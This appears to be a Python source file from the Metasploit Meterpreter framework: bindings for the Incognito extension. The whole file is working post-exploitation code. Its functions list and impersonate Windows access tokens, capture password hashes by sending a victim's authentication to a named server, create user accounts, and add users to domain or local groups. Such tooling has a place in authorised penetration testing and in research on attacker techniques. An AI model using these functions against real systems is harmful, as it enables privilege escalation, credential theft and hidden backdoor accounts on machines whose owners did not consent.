import meterpreter_bindings

from meterpreter.core import *
from meterpreter.tlv import *

INCOGNITO_NO_TOKENS = 'No tokens available\n'

def list_user_tokens():
  return __list_tokens_internal(0)

def list_group_tokens():
  return __list_tokens_internal(1)

def __list_tokens_internal(order):
  tlv = tlv_pack(TLV_TYPE_INCOGNITO_LIST_TOKENS_TOKEN_ORDER, order)
  resp = invoke_meterpreter('incognito_list_tokens', True, tlv)

  if resp == None:
    return None

  if packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] != 0:
    return None

  delegation = packet_get_tlv(resp, TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION)['value']
  impersonation = packet_get_tlv(resp, TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION)['value']
  return {
    'Impersonation': impersonation.strip().split('\n') if impersonation != INCOGNITO_NO_TOKENS else [],
    'Delegation': delegation.strip().split('\n') if delegation != INCOGNITO_NO_TOKENS else []
  }

def impersonate(user):
  tlv = tlv_pack(TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN, user)
  resp = invoke_meterpreter('incognito_impersonate_token', True, tlv)

  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def snarf_hashes(server):
  tlv = tlv_pack(TLV_TYPE_INCOGNITO_SERVERNAME, server)
  resp = invoke_meterpreter('incognito_snarf_hashes', True, tlv)

  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def add_user(server, username, password):
  tlv = tlv_pack(TLV_TYPE_INCOGNITO_SERVERNAME, server)
  tlv += tlv_pack(TLV_TYPE_INCOGNITO_USERNAME, username)
  tlv += tlv_pack(TLV_TYPE_INCOGNITO_PASSWORD, password)

  resp = invoke_meterpreter('incognito_add_user', True, tlv)

  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def add_group_user(server, group, username):
  return __add_group_user_internal('incognito_add_group_user', server, group, username)

def add_localgroup_user(server, group, username):
  return __add_group_user_internal('incognito_add_localgroup_user', server, group, username)

def __add_group_user_internal(msg, server, group, username):
  tlv = tlv_pack(TLV_TYPE_INCOGNITO_SERVERNAME, server)
  tlv += tlv_pack(TLV_TYPE_INCOGNITO_USERNAME, username)
  tlv += tlv_pack(TLV_TYPE_INCOGNITO_GROUPNAME, group)

  resp = invoke_meterpreter(msg, True, tlv)

  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0
